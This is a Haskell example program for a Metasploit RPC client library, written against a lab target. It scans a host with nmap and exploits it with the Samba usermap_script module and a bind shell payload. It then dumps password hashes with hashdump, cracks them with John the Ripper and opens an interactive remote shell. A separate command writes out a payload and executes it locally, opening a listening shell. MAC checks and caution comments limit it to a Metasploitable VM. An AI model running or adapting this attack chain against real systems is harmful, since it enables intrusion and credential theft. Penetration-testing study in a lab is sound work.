{-# LANGUAGE DataKinds #-}

module Main where

--import RPC.Session
import Types.DB
--import RPC.Module (ModuleType(..), ModuleName(..), Payload(..), ExecResult(..))

import MSF
import MSF.Auth
import MSF.Console
import MSF.Commands
import MSF.Session as MSession
import MSF.Event(waitJob)
import MSF.Module
import MSF.Job

import System.Environment (getArgs)
import System.Directory (removeFile)
import System.Posix.Files
import System.Process (runCommand, waitForProcess)

import MonadLib
import Control.Concurrent (threadDelay)
--import Control.Monad (when,void,forever)
import System.IO (hSetBuffering,stdout,BufferMode(..))
import qualified Data.Map as Map
import qualified Data.ByteString as B (ByteString, writeFile) 

data Command = InteractCmd | CleanCmd | ShellCmd | PayloadCmd | CheckCmd | Test deriving (Eq)

-- ------------------------------------------------------------
-- Test values - configure according to your environment.
-- ------------------------------------------------------------

msfUser :: Username
msfUser = "msf"
msfPass :: Password
msfPass = "test"

-- |The Metasploit server
msfRpcServer :: Con Server
msfRpcServer  = Con
  { conHost = Host "10.0.0.2"
  , conPort = "55553"
  }

-- |A host that's OK to attack. For instance, download the
-- "Metasploitable" virtual machine, which is vulnerable to the Samba
-- exploit below.
scanAndAttackHost :: Host Scannable
scanAndAttackHost  = Host "10.0.0.4"

-- |The example finds the target by IP address and checks the MAC
-- address so that it won't accidentally launch an attack against the
-- wrong system. Set this mac address to the metasploitable VM's mac
-- address.
scanAndAttackMAC :: MAC
scanAndAttackMAC = MAC "00:00:00:00:00:00"

-- |A host that should be scanned, but not attacked.
scanDontAttackHost :: Host Scannable
scanDontAttackHost  = Host "10.0.0.10"

metasploitableModuleType :: ModuleType
metasploitableModuleType = ExploitModuleType

metasploitableModuleName :: ModuleName
metasploitableModuleName = ModuleName "multi/samba/usermap_script"

metasploitablePayload    :: Payload
metasploitablePayload    = Payload "cmd/unix/bind_perl"

-- ------------------------------------------------------------
-- Event Handlers
-- ------------------------------------------------------------

-- |Callback for "onHost" events. Double checks that the host we were
-- given is the target that we want to attack and verifies that there
-- is not already a session open on this host.
onHostLaunch :: (QuietCxt s) => HandlerRef -> HostInfo -> MSF s ()
onHostLaunch _ref hi = do
  let addr = hostAddress hi
  sessions <- MSession.session_list
  if (addr /= scanAndAttackHost || (hostMAC hi /= scanAndAttackMAC))
    then writeLog ("Wrong host, not attacking: "
                     ++ getHost addr ++ " - " ++ (getMAC $ hostMAC hi))
    else if null (MSession.sessions_on_host sessions addr)
          then do
            writeLog ("Attacking: " ++ getHost addr)
            -- explicitly converting addr to attackable
            loud (launchExploit (attackableHost addr))
          else do  -- Don't attack it twice
            writeLog ("Session already open for " ++ getHost addr)

-- |Callback for for the "check" command. An "onHost" event that just
-- checks if the target server is at the expected IP address. Quits
-- program when done.
onHostCheck :: QuietCxt s => HandlerRef -> HostInfo -> MSF s ()
onHostCheck _ref hi = do
  let addr = hostAddress hi
  if (addr == scanAndAttackHost) then do
    writeLog ("Found expected host: " ++ getHost addr)
    if (hostMAC hi == scanAndAttackMAC)
      then do
        writeLog ("Expected host has expected MAC: "
                     ++ (getMAC $ hostMAC hi) ++ "\nDone.")
      else writeLog ("ERROR!!!!! Expected host has wrong MAC: "
                     ++ (getMAC $ hostMAC hi))
    else return ()

-- |Callback for "onSession" events. When we have a session, run whoami.
onSessionWhoami :: (QuietCxt s)
                => Bool -> HandlerRef -> (SessionId, Session) -> MSF s ()
onSessionWhoami doShell _ref (sid, _) = do
  writeLog "Gathering credentials"
  loud $ gatherCredentials sid
  writeLog "Checking whoami"
  _ <- loud $ MSession.session_shell_write sid "whoami\n"
  promptWait
  delay 1000000
  whoamiOut <- MSession.session_shell_read  sid Nothing
  writeLog ("Output from whoami: " ++ readData whoamiOut)
  when doShell $ do
    writeLog "dropping into shell"
    loud $ shell sid

onCredPrint :: (QuietCxt s) => HandlerRef -> Cred -> MSF s ()
onCredPrint _ref c = writeLog ("Found credential: " ++ (show c))

-- |Once we gather credentials, automatically start cracking them
-- using john the ripper (jtr).
onLootCrack :: (QuietCxt s) => HandlerRef -> Loot -> MSF s ()
onLootCrack _ref l = do
  writeLog ("Found loot:  "++ (show l))
  let modTyp = AuxiliaryModuleType
      modNm = ModuleName name
      name       =  "analyze/jtr_linux"
  matchingJobs <- job_list_name_substring2 name
  case matchingJobs of
    [] -> do
      writeLog ("Job not found, running crack: " ++ name)
      _ <- loud $ module_execute modTyp modNm 
            $ toObject
            $ Map.fromList ([] :: [(String, Object)])
      return ()
    _  -> writeLog ("Job already running: " ++ name)
  return ()

-- | Launches an example exploit against a target host. Configure
-- statically above.
launchExploit :: (LoudCxt s) => Host Attackable -> MSF s ()
launchExploit targetHost = do
  _ <- module_execute metasploitableModuleType metasploitableModuleName
      $ toObject
      $ Map.fromList
          [ ("RHOST",   toObject targetHost)
          , ("PAYLOAD", toObject metasploitablePayload)
          ]
  return ()

-- |Grab the password hashes.
gatherCredentials :: (LoudCxt s) => SessionId -> MSF s ()
gatherCredentials sessionId = do
  let modTyp = PostModuleType
      modNm = ModuleName "linux/gather/hashdump"

  r <- module_execute modTyp modNm
      $ toObject
      $ Map.fromList
          [ ("SESSION",   toObject sessionId)
          ]
  case r of
    (ExecJobId j) -> waitJob j
    _             -> return ()


-- ------------------------------------------------------------
-- Commands
-- ------------------------------------------------------------
-- |Cleans up the loots, sessions, hosts, and services.
cleanup :: (QuietCxt s) => MSF s ()
cleanup = do
  writeLog "Cleaning"
  _ <- delete_loots  -- silent
  _ <- stop_sessions -- quiet
  _ <- remove_hosts  -- silent
  _ <- stop_services -- silent
  _ <- console_read
  return ()

-- |For a given session, this is a simple read-eval-print loop for
-- user interaction with the shell.
shell :: SessionId -> MSF Loud ()
shell sid = do
  writeLog "# "
  line <- io getLine
  if (line == "exit") then return ()
  else do
    _  <- MSession.session_shell_write sid (line ++ "\n")
    output <- MSession.session_shell_read sid Nothing
    writeLog (readData output)
    shell sid

-- ------------------------------------------------------------
-- Little helpers
-- ------------------------------------------------------------

-- |Simple getArgs parsing.
parseArgs :: IO (Maybe Command)
parseArgs = do 
  args <- getArgs
  case args of
    ("clean":_)     -> return $ Just CleanCmd
    ("interact": _) -> return $ Just InteractCmd
    ("shell":_)     -> return $ Just ShellCmd
    ("check":_)     -> return $ Just CheckCmd
    ("payload":_)   -> return $ Just PayloadCmd
    ("test":_)      -> return $ Just Test
    _               -> return Nothing

-- |Block to interact with the user
promptWait :: MSF s ()
promptWait = io $ do
  command <- parseArgs
  when (command == Just InteractCmd)
       (putStr "Hit enter." >> getLine >> return ())

-- |Periodically prints the contents of the console.
printConsole :: (QuietCxt s) => MSF s ()
printConsole = do
  s <- console_read
  case s of
    Just cr -> writeLog $ consoleReadData cr
    Nothing -> writeLog "Couldn't read console"
  delay 2000000
  printConsole

-- ------------------------------------------------------------
-- CAUTION - Local payload - opens a command interpreter on a local
-- port. This means that anyone who connects to this port can run any
-- command as the user.
-- ------------------------------------------------------------

-- |Caution. Example for extracting a payload from the msf server,
-- writing it to a file on the client (Haskell) side, and executing
-- it.
payloadCmd :: SilentCxt s => MSF s ()
payloadCmd = do
  let port = "4444"
  (ExecPayload pl) <- module_execute_payload metasploitablePayload 
                            $ toObject
                            $ Map.fromList [("LPORT", port)]
  io $ do
       putStr ("This command opens a reverse shell on local port: "
               ++ port ++ ". Type YES to proceed: ")
       maybeYes <- getLine
       if maybeYes == "YES"
       then executeLocalPayload pl
       else putStrLn "Not executing."

-- |Caution. For the given bytestring, write it to a file and execute it.
executeLocalPayload :: B.ByteString -> IO ()
executeLocalPayload pl = do
  let file = "./out"
  B.writeFile file pl
  setFileMode file (foldl1 unionFileModes
                           [ownerExecuteMode, ownerReadMode, ownerWriteMode])
  void (runCommand file >>= waitForProcess)
  removeFile file

writeLog :: String -> MSF s ()
writeLog = io . putStrLn

delay :: Int -> MSF s ()
delay = io . threadDelay

-- ------------------------------------------------------------
-- Initialization
-- ------------------------------------------------------------

-- |Having logged into target, set up the handlers and run the nmap
-- commands that gets everything started. Block forever.

setup :: Bool -> MSF Quiet ()
setup doShell = do
  -- Registering event handlers:
  void (onHost onHostLaunch)
  void (onSession (onSessionWhoami doShell))
  void (onCred onCredPrint)
  void (onLoot onLootCrack)
  void (spawn printConsole)

  -- |Do some port scanning
  writeLog "Checking if host is up using quiet scan"
  _ <- db_nmap pingScan (single scanAndAttackHost)
  promptWait

  -- fall back on a loud context here
  writeLog "Getting open ports and OS fingerprints"
  _ <- loud (db_nmap serviceVersionScan (single scanAndAttackHost))
  promptWait
  writeLog "Scanning non-attackable host"
  _ <- loud (db_nmap serviceVersionScan (single scanDontAttackHost))
  -- sleep forever, events will drive future computation
  forever (delay 1000000)

runTest :: MSF Quiet ()
runTest = do
  testAuth

testAuth :: MSF Quiet ()
testAuth = do

  _ <- getTokList

  writeLog "Trying to log in again with same user/pass..."
  res <- auth_login msfUser msfPass
  tok <- case res of
    Right tok -> writeLog "Login successful" >> return tok
    Left msg -> error ("Login failed: " ++ msg)

  _ <- getTokList

  writeLog "Trying to remove temporary auth token..."
  _ <- auth_token_remove tok
  writeLog "Removal successful"

  _ <- getTokList

  writeLog "Generating new token..."
  genTok <- auth_token_generate
  writeLog ("Got token: " ++ show genTok)

  _ <- getTokList
  writeLog "Finished."

  where
  getTokList :: MSF Quiet [Token]
  getTokList = do
    toks <- auth_token_list
    writeLog ("Current tokens:\n" ++ show toks)
    return toks

-- |Check to see that expected host is online & such
check :: MSF Loud ()
check = do
  writeLog "MSF server is online. Looking for target host."
  void (onHost onHostCheck)
  _ <- db_nmap serviceVersionScan (single scanAndAttackHost)
  -- sleep forever, events will drive future computation
  forever (delay 1000000)

-- |Process the command line args & dispatch
commands :: Maybe Command -> MSF Quiet ()
commands command = do
  writeLog "Login successful."
  case command of
    Just CleanCmd    -> cleanup
    Just CheckCmd    -> loud check
    Just PayloadCmd  -> payloadCmd
    Just ShellCmd    -> setup True
    Just InteractCmd -> setup False
    Just Test        -> runTest
    Nothing          -> setup False

main :: IO ()
main = do
  hSetBuffering stdout NoBuffering
  c <- parseArgs
  login msfRpcServer msfUser msfPass (commands c)
